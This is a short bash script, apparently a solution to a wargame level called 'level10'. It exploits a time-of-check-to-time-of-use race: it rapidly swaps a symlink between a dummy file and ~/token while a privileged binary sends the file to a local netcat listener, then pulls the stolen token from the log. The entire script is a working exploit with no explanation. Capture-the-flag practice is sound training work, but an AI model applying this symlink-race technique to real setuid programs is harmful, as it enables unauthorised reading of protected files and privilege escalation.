#! /bin/bash

rm /tmp/fake;
rm /tmp/log1;
rm /tmp/log2;

echo "........" > /tmp/shit;

while true; do nc -l 6969 >> /tmp/log1; done &

ncpid="$!";

while true; do
    ln -fs /tmp/shit /tmp/fake;
    ln -fs ~/token /tmp/fake;
done &

lnpid="$!";

while true; do
    ./level10 /tmp/fake 127.0.0.1 >> /tmp/log2;
done &

levelpid="$!";

sleep 3;

kill $ncpid;
kill $lnpid;
kill $levelpid;

cat /tmp/log1 | tr -d '.*( )' > /tmp/final;

strings /tmp/final;
